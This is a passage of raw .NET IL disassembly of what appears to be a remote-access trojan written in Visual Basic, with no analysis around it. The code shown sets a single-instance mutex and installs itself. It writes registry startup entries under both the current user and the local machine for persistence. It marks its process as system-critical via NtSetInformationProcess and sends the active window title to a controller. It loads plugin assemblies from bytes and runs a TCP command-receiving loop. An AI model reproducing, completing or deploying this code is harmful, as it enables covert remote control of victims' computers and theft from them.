      IL_0049:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_004e:  nop
      IL_004f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0054:  leave.s    IL_0056

    }  // end handler
    IL_0056:  nop
    IL_0057:  ldc.i4     0x1388
    IL_005c:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
    IL_0061:  nop
    IL_0062:  nop
    IL_0063:  ldc.i4.0
    IL_0064:  stloc.0
    IL_0065:  ldc.i4.1
    IL_0066:  ldsfld     string j.OK::RG
    IL_006b:  ldloca.s   V_0
    IL_006d:  newobj     instance void [mscorlib]System.Threading.Mutex::.ctor(bool,
                                                                               string,
                                                                               bool&)
    IL_0072:  stsfld     object j.OK::MT
    IL_0077:  ldloc.0
    IL_0078:  ldc.i4.0
    IL_0079:  ceq
    IL_007b:  stloc.s    V_21
    IL_007d:  ldloc.s    V_21
    IL_007f:  brfalse.s  IL_0087

    IL_0081:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_0086:  nop
    IL_0087:  nop
    IL_0088:  call       void j.OK::INS()
    IL_008d:  nop
    IL_008e:  ldsfld     bool j.OK::Idr
    IL_0093:  ldc.i4.0
    IL_0094:  ceq
    IL_0096:  stloc.s    V_21
    IL_0098:  ldloc.s    V_21
    IL_009a:  brfalse.s  IL_00bf

    IL_009c:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
    IL_00a1:  callvirt   instance string [mscorlib]System.IO.FileInfo::get_Name()
    IL_00a6:  stsfld     string j.OK::EXE
    IL_00ab:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
    IL_00b0:  callvirt   instance class [mscorlib]System.IO.DirectoryInfo [mscorlib]System.IO.FileInfo::get_Directory()
    IL_00b5:  callvirt   instance string [mscorlib]System.IO.DirectoryInfo::get_Name()
    IL_00ba:  stsfld     string j.OK::DR
    IL_00bf:  nop
    IL_00c0:  ldnull
    IL_00c1:  ldftn      void j.OK::RC()
    IL_00c7:  newobj     instance void [mscorlib]System.Threading.ThreadStart::.ctor(object,
                                                                                     native int)
    IL_00cc:  ldc.i4.1
    IL_00cd:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ThreadStart,
                                                                                int32)
    IL_00d2:  stloc.2
    IL_00d3:  ldloc.2
    IL_00d4:  callvirt   instance void [mscorlib]System.Threading.Thread::Start()
    IL_00d9:  nop
    IL_00da:  nop
    .try
    {
      IL_00db:  newobj     instance void j.kl::.ctor()
      IL_00e0:  stsfld     class j.kl j.OK::kq
      IL_00e5:  ldsfld     class j.kl j.OK::kq
      IL_00ea:  dup
      IL_00eb:  ldvirtftn  instance void j.kl::WRK()
      IL_00f1:  newobj     instance void [mscorlib]System.Threading.ThreadStart::.ctor(object,
                                                                                       native int)
      IL_00f6:  ldc.i4.1
      IL_00f7:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ThreadStart,
                                                                                  int32)
      IL_00fc:  stloc.s    V_6
      IL_00fe:  ldloc.s    V_6
      IL_0100:  callvirt   instance void [mscorlib]System.Threading.Thread::Start()
      IL_0105:  nop
      IL_0106:  leave.s    IL_012a

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0108:  dup
      IL_0109:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_010e:  stloc.s    V_8
      IL_0110:  nop
      IL_0111:  ldloc.s    V_8
      IL_0113:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0118:  nop
      IL_0119:  ldloc.s    V_8
      IL_011b:  stloc.s    V_7
      IL_011d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0122:  nop
      IL_0123:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0128:  leave.s    IL_012a

    }  // end handler
    IL_012a:  nop
    IL_012b:  ldc.i4.0
    IL_012c:  stloc.1
    IL_012d:  ldstr      ""
    IL_0132:  stloc.3
    IL_0133:  ldsfld     bool j.OK::BD
    IL_0138:  stloc.s    V_21
    IL_013a:  ldloc.s    V_21
    IL_013c:  brfalse.s  IL_017d

    IL_013e:  nop
    .try
    {
      IL_013f:  ldnull
      IL_0140:  ldftn      void j.OK::_Lambda__2(object,
                                                 class [System]Microsoft.Win32.SessionEndingEventArgs)
      IL_0146:  newobj     instance void [System]Microsoft.Win32.SessionEndingEventHandler::.ctor(object,
                                                                                                  native int)
      IL_014b:  call       void [System]Microsoft.Win32.SystemEvents::add_SessionEnding(class [System]Microsoft.Win32.SessionEndingEventHandler)
      IL_0150:  nop
      IL_0151:  ldc.i4.1
      IL_0152:  call       void j.OK::pr(int32)
      IL_0157:  nop
      IL_0158:  leave.s    IL_017c

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_015a:  dup
      IL_015b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0160:  stloc.s    V_10
      IL_0162:  nop
      IL_0163:  ldloc.s    V_10
      IL_0165:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_016a:  nop
      IL_016b:  ldloc.s    V_10
      IL_016d:  stloc.s    V_9
      IL_016f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0174:  nop
      IL_0175:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_017a:  leave.s    IL_017c

    }  // end handler
    IL_017c:  nop
    IL_017d:  nop
    IL_017e:  br         IL_03e8

    IL_0183:  ldc.i4     0x3e8
    IL_0188:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
    IL_018d:  nop
    IL_018e:  ldsfld     bool j.OK::Cn
    IL_0193:  ldc.i4.0
    IL_0194:  ceq
    IL_0196:  stloc.s    V_21
    IL_0198:  ldloc.s    V_21
    IL_019a:  brfalse.s  IL_01a2

    IL_019c:  ldstr      ""
    IL_01a1:  stloc.3
    IL_01a2:  nop
    IL_01a3:  call       void [System.Windows.Forms]System.Windows.Forms.Application::DoEvents()
    IL_01a8:  nop
    IL_01a9:  nop
    .try
    {
      IL_01aa:  ldloc.1
      IL_01ab:  ldc.i4.1
      IL_01ac:  add.ovf
      IL_01ad:  stloc.1
      IL_01ae:  ldloc.1
      IL_01af:  ldc.i4.5
      IL_01b0:  ceq
      IL_01b2:  stloc.s    V_21
      IL_01b4:  ldloc.s    V_21
      IL_01b6:  brfalse.s  IL_01f3

      IL_01b8:  nop
      .try
      {
        IL_01b9:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::GetCurrentProcess()
        IL_01be:  ldc.i4     0x400
        IL_01c3:  call       native int [mscorlib]System.IntPtr::op_Explicit(int32)
        IL_01c8:  callvirt   instance void [System]System.Diagnostics.Process::set_MinWorkingSet(native int)
        IL_01cd:  nop
        IL_01ce:  leave.s    IL_01f2

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_01d0:  dup
        IL_01d1:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_01d6:  stloc.s    V_11
        IL_01d8:  nop
        IL_01d9:  ldloc.s    V_11
        IL_01db:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_01e0:  nop
        IL_01e1:  ldloc.s    V_11
        IL_01e3:  stloc.s    V_12
        IL_01e5:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_01ea:  nop
        IL_01eb:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_01f0:  leave.s    IL_01f2

      }  // end handler
      IL_01f2:  nop
      IL_01f3:  nop
      IL_01f4:  ldloc.1
      IL_01f5:  ldc.i4.8
      IL_01f6:  clt
      IL_01f8:  ldc.i4.0
      IL_01f9:  ceq
      IL_01fb:  stloc.s    V_21
      IL_01fd:  ldloc.s    V_21
      IL_01ff:  brfalse.s  IL_023a

      IL_0201:  ldc.i4.0
      IL_0202:  stloc.1
      IL_0203:  call       string j.OK::ACT()
      IL_0208:  stloc.s    V_13
      IL_020a:  ldloc.3
      IL_020b:  ldloc.s    V_13
      IL_020d:  ldc.i4.0
      IL_020e:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0213:  ldc.i4.0
      IL_0214:  ceq
      IL_0216:  ldc.i4.0
      IL_0217:  ceq
      IL_0219:  stloc.s    V_21
      IL_021b:  ldloc.s    V_21
      IL_021d:  brfalse.s  IL_0239

      IL_021f:  ldloc.s    V_13
      IL_0221:  stloc.3
      IL_0222:  ldstr      "act"
      IL_0227:  ldsfld     string j.OK::Y
      IL_022c:  ldloc.s    V_13
      IL_022e:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0233:  call       bool j.OK::Send(string)
      IL_0238:  pop
      IL_0239:  nop
      IL_023a:  nop
      IL_023b:  ldsfld     bool j.OK::Isu
      IL_0240:  stloc.s    V_21
      IL_0242:  ldloc.s    V_21
      IL_0244:  brfalse    IL_03c1

      IL_0249:  nop
      .try
      {
        IL_024a:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
        IL_024f:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
        IL_0254:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
        IL_0259:  ldsfld     string j.OK::sf
        IL_025e:  ldstr      "\\"
        IL_0263:  ldsfld     string j.OK::RG
        IL_0268:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_026d:  ldstr      ""
        IL_0272:  callvirt   instance object [mscorlib]Microsoft.Win32.RegistryKey::GetValue(string,
                                                                                             object)
        IL_0277:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
        IL_027c:  ldstr      "\""
        IL_0281:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
        IL_0286:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
        IL_028b:  ldstr      "\" .."
        IL_0290:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_0295:  ldc.i4.0
        IL_0296:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConditionalCompareObjectNotEqual(object,
                                                                                                                                            object,
                                                                                                                                            bool)
        IL_029b:  stloc.s    V_22
        IL_029d:  ldloc.s    V_22
        IL_029f:  brfalse.s  IL_02df

        IL_02a1:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
        IL_02a6:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
        IL_02ab:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
        IL_02b0:  ldsfld     string j.OK::sf
        IL_02b5:  ldc.i4.1
        IL_02b6:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                    bool)
        IL_02bb:  ldsfld     string j.OK::RG
        IL_02c0:  ldstr      "\""
        IL_02c5:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
        IL_02ca:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
        IL_02cf:  ldstr      "\" .."
        IL_02d4:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_02d9:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                           object)
        IL_02de:  nop
        IL_02df:  nop
        IL_02e0:  leave.s    IL_0304

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_02e2:  dup
        IL_02e3:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_02e8:  stloc.s    V_14
        IL_02ea:  nop
        IL_02eb:  ldloc.s    V_14
        IL_02ed:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_02f2:  nop
        IL_02f3:  ldloc.s    V_14
        IL_02f5:  stloc.s    V_15
        IL_02f7:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_02fc:  nop
        IL_02fd:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0302:  leave.s    IL_0304

      }  // end handler
      IL_0304:  nop
      IL_0305:  nop
      .try
      {
        IL_0306:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
        IL_030b:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
        IL_0310:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_LocalMachine()
        IL_0315:  ldsfld     string j.OK::sf
        IL_031a:  ldstr      "\\"
        IL_031f:  ldsfld     string j.OK::RG
        IL_0324:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_0329:  ldstr      ""
        IL_032e:  callvirt   instance object [mscorlib]Microsoft.Win32.RegistryKey::GetValue(string,
                                                                                             object)
        IL_0333:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
        IL_0338:  ldstr      "\""
        IL_033d:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
        IL_0342:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
        IL_0347:  ldstr      "\" .."
        IL_034c:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_0351:  ldc.i4.0
        IL_0352:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConditionalCompareObjectNotEqual(object,
                                                                                                                                            object,
                                                                                                                                            bool)
        IL_0357:  stloc.s    V_22
        IL_0359:  ldloc.s    V_22
        IL_035b:  brfalse.s  IL_039b

        IL_035d:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
        IL_0362:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
        IL_0367:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_LocalMachine()
        IL_036c:  ldsfld     string j.OK::sf
        IL_0371:  ldc.i4.1
        IL_0372:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                    bool)
        IL_0377:  ldsfld     string j.OK::RG
        IL_037c:  ldstr      "\""
        IL_0381:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
        IL_0386:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
        IL_038b:  ldstr      "\" .."
        IL_0390:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_0395:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                           object)
        IL_039a:  nop
        IL_039b:  nop
        IL_039c:  leave.s    IL_03c0

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_039e:  dup
        IL_039f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_03a4:  stloc.s    V_16
        IL_03a6:  nop
        IL_03a7:  ldloc.s    V_16
        IL_03a9:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_03ae:  nop
        IL_03af:  ldloc.s    V_16
        IL_03b1:  stloc.s    V_17
        IL_03b3:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_03b8:  nop
        IL_03b9:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_03be:  leave.s    IL_03c0

      }  // end handler
      IL_03c0:  nop
      IL_03c1:  nop
      IL_03c2:  leave.s    IL_03e6

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_03c4:  dup
      IL_03c5:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_03ca:  stloc.s    V_18
      IL_03cc:  nop
      IL_03cd:  ldloc.s    V_18
      IL_03cf:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_03d4:  nop
      IL_03d5:  ldloc.s    V_18
      IL_03d7:  stloc.s    V_19
      IL_03d9:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_03de:  nop
      IL_03df:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_03e4:  leave.s    IL_03e6

    }  // end handler
    IL_03e6:  nop
    IL_03e7:  nop
    IL_03e8:  ldc.i4.1
    IL_03e9:  stloc.s    V_22
    IL_03eb:  ldloc.s    V_22
    IL_03ed:  brtrue     IL_0183

    IL_03f2:  nop
    IL_03f3:  ret
  } // end of method OK::ko

  .method public static string  md5(uint8[] B) cil managed
  {
    // Code size       75 (0x4b)
    .maxstack  3
    .locals init (string V_0,
             uint8 V_1,
             string V_2,
             int32 V_3,
             uint8[] V_4,
             bool V_5)
    IL_0000:  nop
    IL_0001:  newobj     instance void [mscorlib]System.Security.Cryptography.MD5CryptoServiceProvider::.ctor()
    IL_0006:  ldarg.0
    IL_0007:  callvirt   instance uint8[] [mscorlib]System.Security.Cryptography.HashAlgorithm::ComputeHash(uint8[])
    IL_000c:  starg.s    B
    IL_000e:  ldstr      ""
    IL_0013:  stloc.2
    IL_0014:  ldarg.0
    IL_0015:  stloc.s    V_4
    IL_0017:  ldc.i4.0
    IL_0018:  stloc.3
    IL_0019:  br.s       IL_0038

    IL_001b:  ldloc.s    V_4
    IL_001d:  ldloc.3
    IL_001e:  ldelem.u1
    IL_001f:  stloc.1
    IL_0020:  ldloc.2
    IL_0021:  ldloca.s   V_1
    IL_0023:  ldstr      "x2"
    IL_0028:  call       instance string [mscorlib]System.Byte::ToString(string)
    IL_002d:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0032:  stloc.2
    IL_0033:  ldloc.3
    IL_0034:  ldc.i4.1
    IL_0035:  add.ovf
    IL_0036:  stloc.3
    IL_0037:  nop
    IL_0038:  ldloc.3
    IL_0039:  ldloc.s    V_4
    IL_003b:  ldlen
    IL_003c:  conv.ovf.i4
    IL_003d:  clt
    IL_003f:  stloc.s    V_5
    IL_0041:  ldloc.s    V_5
    IL_0043:  brtrue.s   IL_001b

    IL_0045:  ldloc.2
    IL_0046:  stloc.0
    IL_0047:  br.s       IL_0049

    IL_0049:  ldloc.0
    IL_004a:  ret
  } // end of method OK::md5

  .method private static pinvokeimpl("ntdll" winapi) 
          int32  NtSetInformationProcess(native int hProcess,
                                         int32 processInformationClass,
                                         int32& processInformation,
                                         int32 processInformationLength) cil managed preservesig
  {
  }
  .method public static object  Plugin(uint8[] b,
                                       string c) cil managed
  {
    // Code size       136 (0x88)
    .maxstack  3
    .locals init (class [mscorlib]System.Reflection.Module V_0,
             object V_1,
             class [mscorlib]System.Type V_2,
             int32 V_3,
             class [mscorlib]System.Reflection.Module[] V_4,
             int32 V_5,
             class [mscorlib]System.Type[] V_6,
             bool V_7)
    IL_0000:  nop
    IL_0001:  ldarg.0
    IL_0002:  call       class [mscorlib]System.Reflection.Assembly [mscorlib]System.Reflection.Assembly::Load(uint8[])
    IL_0007:  callvirt   instance class [mscorlib]System.Reflection.Module[] [mscorlib]System.Reflection.Assembly::GetModules()
    IL_000c:  stloc.s    V_4
    IL_000e:  ldc.i4.0
    IL_000f:  stloc.3
    IL_0010:  br.s       IL_0075

    IL_0012:  ldloc.s    V_4
    IL_0014:  ldloc.3
    IL_0015:  ldelem.ref
    IL_0016:  stloc.0
    IL_0017:  ldloc.0
    IL_0018:  callvirt   instance class [mscorlib]System.Type[] [mscorlib]System.Reflection.Module::GetTypes()
    IL_001d:  stloc.s    V_6
    IL_001f:  ldc.i4.0
    IL_0020:  stloc.s    V_5
    IL_0022:  br.s       IL_0062

    IL_0024:  ldloc.s    V_6
    IL_0026:  ldloc.s    V_5
    IL_0028:  ldelem.ref
    IL_0029:  stloc.2
    IL_002a:  ldloc.2
    IL_002b:  callvirt   instance string [mscorlib]System.Type::get_FullName()
    IL_0030:  ldstr      "."
    IL_0035:  ldarg.1
    IL_0036:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_003b:  callvirt   instance bool [mscorlib]System.String::EndsWith(string)
    IL_0040:  stloc.s    V_7
    IL_0042:  ldloc.s    V_7
    IL_0044:  brfalse.s  IL_005a

    IL_0046:  ldloc.0
    IL_0047:  callvirt   instance class [mscorlib]System.Reflection.Assembly [mscorlib]System.Reflection.Module::get_Assembly()
    IL_004c:  ldloc.2
    IL_004d:  callvirt   instance string [mscorlib]System.Type::get_FullName()
    IL_0052:  callvirt   instance object [mscorlib]System.Reflection.Assembly::CreateInstance(string)
    IL_0057:  stloc.1
    IL_0058:  br.s       IL_0086

    IL_005a:  nop
    IL_005b:  ldloc.s    V_5
    IL_005d:  ldc.i4.1
    IL_005e:  add.ovf
    IL_005f:  stloc.s    V_5
    IL_0061:  nop
    IL_0062:  ldloc.s    V_5
    IL_0064:  ldloc.s    V_6
    IL_0066:  ldlen
    IL_0067:  conv.ovf.i4
    IL_0068:  clt
    IL_006a:  stloc.s    V_7
    IL_006c:  ldloc.s    V_7
    IL_006e:  brtrue.s   IL_0024

    IL_0070:  ldloc.3
    IL_0071:  ldc.i4.1
    IL_0072:  add.ovf
    IL_0073:  stloc.3
    IL_0074:  nop
    IL_0075:  ldloc.3
    IL_0076:  ldloc.s    V_4
    IL_0078:  ldlen
    IL_0079:  conv.ovf.i4
    IL_007a:  clt
    IL_007c:  stloc.s    V_7
    IL_007e:  ldloc.s    V_7
    IL_0080:  brtrue.s   IL_0012

    IL_0082:  ldnull
    IL_0083:  stloc.1
    IL_0084:  br.s       IL_0086

    IL_0086:  ldloc.1
    IL_0087:  ret
  } // end of method OK::Plugin

  .method public static void  pr(int32 i) cil managed
  {
    // Code size       58 (0x3a)
    .maxstack  4
    .locals init (class [mscorlib]System.Exception V_0,
             class [mscorlib]System.Exception V_1)
    IL_0000:  nop
    IL_0001:  nop
    .try
    {
      IL_0002:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::GetCurrentProcess()
      IL_0007:  callvirt   instance native int [System]System.Diagnostics.Process::get_Handle()
      IL_000c:  ldc.i4.s   29
      IL_000e:  ldarga.s   i
      IL_0010:  ldc.i4.4
      IL_0011:  call       int32 j.OK::NtSetInformationProcess(native int,
                                                               int32,
                                                               int32&,
                                                               int32)
      IL_0016:  pop
      IL_0017:  leave.s    IL_0037

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0019:  dup
      IL_001a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_001f:  stloc.1
      IL_0020:  nop
      IL_0021:  ldloc.1
      IL_0022:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0027:  nop
      IL_0028:  ldloc.1
      IL_0029:  stloc.0
      IL_002a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_002f:  nop
      IL_0030:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0035:  leave.s    IL_0037

    }  // end handler
    IL_0037:  nop
    IL_0038:  nop
    IL_0039:  ret
  } // end of method OK::pr

  .method public static void  RC() cil managed
  {
    // Code size       742 (0x2e6)
    .maxstack  8
    .locals init (int64 V_0,
             int32 V_1,
             int32 V_2,
             int64 V_3,
             string V_4,
             int32 V_5,
             class [mscorlib]System.Threading.Thread V_6,
             class [mscorlib]System.Exception V_7,
             class [mscorlib]System.Exception V_8,
             class [mscorlib]System.Exception V_9,
             class [mscorlib]System.Exception V_10,
             int32 V_11,
             char V_12,
             bool V_13,
             bool V_14,
             int32 V_15)
    IL_0000:  nop
    IL_0001:  nop
    IL_0002:  nop
    IL_0003:  ldstr      ""
    IL_0008:  stsfld     string j.OK::lastcap
    IL_000d:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
    IL_0012:  ldnull
    IL_0013:  ceq
    IL_0015:  ldc.i4.0
    IL_0016:  ceq
    IL_0018:  stloc.s    V_13
    IL_001a:  ldloc.s    V_13
    IL_001c:  brfalse    IL_0261

    IL_0021:  ldc.i4.m1
    IL_0022:  conv.i8
    IL_0023:  stloc.0
    IL_0024:  ldc.i4.0
    IL_0025:  stloc.1
    IL_0026:  nop
    .try
    {
      IL_0027:  nop
      IL_0028:  nop
      IL_0029:  ldloc.1
      IL_002a:  ldc.i4.1
      IL_002b:  add.ovf
      IL_002c:  stloc.1
      IL_002d:  ldloc.1
      IL_002e:  ldc.i4.s   10
      IL_0030:  ceq
      IL_0032:  stloc.s    V_13
      IL_0034:  ldloc.s    V_13
      IL_0036:  brfalse.s  IL_0041

      IL_0038:  ldc.i4.0
      IL_0039:  stloc.1
      IL_003a:  ldc.i4.1
      IL_003b:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
      IL_0040:  nop
      IL_0041:  nop
      IL_0042:  ldsfld     bool j.OK::Cn
      IL_0047:  ldc.i4.0
      IL_0048:  ceq
      IL_004a:  stloc.s    V_13
      IL_004c:  ldloc.s    V_13
      IL_004e:  brfalse.s  IL_0056

      IL_0050:  nop
      IL_0051:  leave      IL_0263

      IL_0056:  nop
      IL_0057:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
      IL_005c:  callvirt   instance int32 [System]System.Net.Sockets.TcpClient::get_Available()
      IL_0061:  ldc.i4.1
      IL_0062:  clt
      IL_0064:  stloc.s    V_13
      IL_0066:  ldloc.s    V_13
      IL_0068:  brfalse.s  IL_007c

      IL_006a:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
      IL_006f:  callvirt   instance class [System]System.Net.Sockets.Socket [System]System.Net.Sockets.TcpClient::get_Client()
      IL_0074:  ldc.i4.m1
      IL_0075:  ldc.i4.0
      IL_0076:  callvirt   instance bool [System]System.Net.Sockets.Socket::Poll(int32,
                                                                                 valuetype [System]System.Net.Sockets.SelectMode)
      IL_007b:  pop
      IL_007c:  nop
      IL_007d:  nop
      IL_007e:  nop
      IL_007f:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
      IL_0084:  callvirt   instance int32 [System]System.Net.Sockets.TcpClient::get_Available()
      IL_0089:  ldc.i4.0
      IL_008a:  cgt
      IL_008c:  stloc.s    V_13
      IL_008e:  ldloc.s    V_13
      IL_0090:  brfalse    IL_023b

      IL_0095:  ldloc.0
      IL_0096:  ldc.i4.m1
      IL_0097:  conv.i8
      IL_0098:  ceq
      IL_009a:  stloc.s    V_14
      IL_009c:  ldloc.s    V_14
      IL_009e:  brfalse    IL_015b

      IL_00a3:  ldstr      ""
      IL_00a8:  stloc.s    V_4
      IL_00aa:  br         IL_0151

      IL_00af:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
      IL_00b4:  callvirt   instance class [System]System.Net.Sockets.NetworkStream [System]System.Net.Sockets.TcpClient::GetStream()
      IL_00b9:  callvirt   instance int32 [mscorlib]System.IO.Stream::ReadByte()
      IL_00be:  stloc.s    V_5
      IL_00c0:  nop
      IL_00c1:  ldloc.s    V_5
      IL_00c3:  ldc.i4.m1
      IL_00c4:  sub
      IL_00c5:  stloc.s    V_15
      IL_00c7:  ldloc.s    V_15
      IL_00c9:  switch     ( 
                            IL_00d8,
                            IL_00e1)
      IL_00d6:  br.s       IL_012c

      IL_00d8:  nop
      IL_00d9:  nop
      IL_00da:  leave      IL_0263

      IL_00df:  br.s       IL_012c

      IL_00e1:  nop
